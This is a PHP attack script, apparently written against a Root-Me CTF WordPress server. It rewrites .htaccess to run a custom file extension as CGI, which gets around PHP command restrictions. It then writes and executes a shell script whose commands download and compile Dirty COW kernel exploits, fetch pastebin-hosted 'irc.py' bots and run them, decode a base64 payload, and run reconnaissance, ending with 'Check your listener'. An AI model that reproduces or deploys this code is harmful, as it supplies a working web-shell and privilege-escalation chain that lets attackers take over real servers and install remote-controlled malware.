<?php

//aller sur http://ctf01.root-me.org/wp-content/uploads/
$cmd = "wget https://access.redhat.com/sites/default/files/rh-cve-2016-5195_2.sh; bash rh-cve-2016-5195_2.sh>gokdf"; //command to be executed
$cmd = "curl -O https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c";
$cmd = "gcc -lpthread dirtyc0w.c -o dirtyc0w";
$cmd = "./dirtyc0w foo m00000000000000000; ls -Al > final";
$cmd = "wget https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c; gcc -pthread c0w.c  -o c0w; touch step1; ./c0w; touch step3; /usr/bin/passwd>step_inter; whoami>lol; id>lol2; touch step2";
$cmd = "wget http://pastebin.com/raw/duAMqZvM; ls -Al > fff; mv duAMqZvM irc.py;";
$cmd = "whoami>who; ls -Al .. > ola; ls -Al ../.. > olala";
$cmd = "wget http://pastebin.com/raw/Btbs07jD; mv Btbs07jD irc8.py; python irc8.py";
$cmd = "wget http://pastebin.com/raw/g7hCz3mE; sed 's/\x0d//g' g7hCz3mE | base64 -d > prog";
//$cmd = "ps -Al > out";
//$cmd = "kill 2228; kill 2245; kill 2272; kill 2296; kill 2311; kill 2325; kill 2340; kill 2372; kill 2407; kill 2491;";
$cmd = "wget http://pastebin.com/raw/2nB0nHUf; mv 2nB0nHUf irc.py; python irc.py";

//$cmd = "python irc6.py";

//http://pastebin.com/raw/ENfXbtNA B64 : dirtyCowFun
//http://pastebin.com/raw/g7hCz3mE B64 : Ba


$shellfile = "#!/bin/bash\n"; //using a shellscript
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd

function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
	echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}


if (!isset($_GET['checked']))
{
	@file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
	header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
}
else
{
	$modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
	$writable = is_writable('.'); //current dir writable?
	$htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?

		checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
		checkEnabled("Is writable",$writable,"Yes","No");
		checkEnabled("htaccess working",$htaccess,"Yes","No");

	if(!($modcgi && $writable && $htaccess))
	{
		echo "Error. All of the above must be true for the script to work!"; //abort if not
	}
	else
	{
		checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
		checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
		checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
		checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
		echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
	}
}
?>
